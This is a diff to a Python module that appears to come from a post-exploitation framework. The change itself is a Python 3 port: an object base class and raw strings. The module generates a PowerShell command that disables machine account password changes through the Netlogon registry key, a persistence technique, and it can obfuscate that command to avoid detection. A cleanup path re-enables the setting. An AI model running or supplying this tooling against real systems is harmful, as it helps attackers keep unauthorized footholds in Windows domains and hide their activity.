@@ -1,6 +1,7 @@
+from builtins import object
 from lib.common import helpers
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -59,12 +60,12 @@ class Module:
         cleanup = self.options['CleanUp']['Value']
 
         if cleanup.lower() == 'true':
-            script = "$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 0; 'Machine account password change re-enabled.'"
+            script = r"$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 0; 'Machine account password change re-enabled.'"
             if obfuscate:
                 script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
             return script
         
-        script = "$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 1; 'Machine account password change disabled.'"
+        script = r"$null=Set-ItemProperty -Force -Path HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters -Name DisablePasswordChange -Value 1; 'Machine account password change disabled.'"
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
         return script
